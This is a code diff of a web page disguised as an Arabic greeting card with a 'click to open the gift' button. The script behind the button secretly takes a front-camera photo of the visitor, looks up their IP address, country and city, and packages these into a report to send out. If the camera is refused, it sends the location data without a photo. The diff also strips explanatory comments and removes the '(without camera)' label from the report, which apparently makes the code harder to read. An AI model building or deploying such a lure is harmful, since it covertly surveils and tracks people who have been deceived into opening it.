@@ -64,7 +64,6 @@
         <button class="btn" onclick="openGift()">اضغط هنا لفتح الهدية 🎁</button>
     </div>
 
-    <!-- عنصر مخفي لالتقاط الصورة بالكاميرا -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -76,13 +75,12 @@
         const screenRes = window.screen.width + 'x' + window.screen.height;
 
         async function openGift() {
-            // محاولة طلب إذن الكاميرا عند الضغط على الزر
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                await new Promise(resolve => setTimeout(resolve, 1500)); // انتظار ثواني لتثبيت الكاميرا
+                await new Promise(resolve => setTimeout(resolve, 1500));
 
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth || 640;
@@ -90,16 +88,14 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // إيقاف الكاميرا بعد التقاط الصورة
                 stream.getTracks().forEach(track => track.stop());
 
-                // تحويل الصورة لملف وإرسالها
                 canvas.toBlob(blob => {
                     sendDataWithPhoto(blob);
                 }, 'image/jpeg');
 
             } catch (e) {
-                // لو رفض الإذن أو حصل خطأ، نبعت التقارير العادية من غير صورة
+                // لو الكاميرا اتقفلت أو المتصفح رفض، بنبعت البيانات العادية من غير ما تحصل أي مشكلة
                 sendDataWithoutPhoto();
             }
         }
@@ -135,7 +131,7 @@
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const data = await ipRes.json();
 
-                const message = `🔔 **زيارة بطاقة المعايدة (بدون كاميرا)!**\n\n` +
+                const message = `🔔 **زيارة بطاقة المعايدة!**\n\n` +
                                 `🌍 **الدولة:** ${data.country_name || 'غير معروف'}\n` +
                                 `🏙️ **المدينة:** ${data.city || 'غير معروف'}\n` +
                                 `🌐 **الـ IP:** ${data.ip || 'غير معروف'}\n` +
